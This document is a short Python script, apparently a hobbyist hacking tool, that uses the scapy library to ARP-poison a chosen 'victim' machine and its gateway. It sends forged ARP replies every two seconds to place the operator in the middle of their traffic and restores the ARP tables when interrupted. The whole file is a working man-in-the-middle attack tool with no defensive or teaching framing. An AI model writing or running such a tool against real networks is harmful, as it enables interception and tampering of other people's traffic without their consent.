#! usr/bin/env python
import scapy.all as scapy
import argparse
import sys
import time
def arguments():
    parser=argparse.ArgumentParser()
    parser.add_argument("--target",dest="victim",help="Victim's IP to posion")
    parser.add_argument("--gateway",dest="gateway",help="Gateway IP to posion")
    options=parser.parse_args()
    if not options.victim:
        parser.error("Please specify the victim's ip")
    elif not options.gateway:
        parser.error("Please specify the gateway's ip")
    return(options)

def get_mac(ip):
    packet_get=scapy.ARP(pdst=ip)
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet_complete=broadcast/packet_get
    answered=scapy.srp(packet_complete, timeout=1, verbose=False)[0]
    return(answered[0][1].hwsrc)



def craft_packet(victim_ip, victim_mac, spoof_ip):
    packet=scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def arp_restore(destination_ip, source_ip):
    dest_mac=get_mac(destination_ip)
    src_mac=get_mac(source_ip)
    restore_packet=scapy.ARP(op=2, pdst=destination_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=src_mac)
    scapy.send(restore_packet)
options=arguments()
try:
    counter=0
    victim_mac=get_mac(options.victim)
    ap_mac=get_mac(options.gateway)
    while True:
        craft_packet(options.gateway, ap_mac, options.victim)
        craft_packet(options.victim, victim_mac, options.gateway)
        counter=counter+2
        print("\r[+] packet sent :" + str(counter), end=" ")
        
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ... Resetting ARP tables..... Please wait.\n")
    arp_restore(options.victim,options.gateway)
    arp_restore(options.gateway,options.victim)


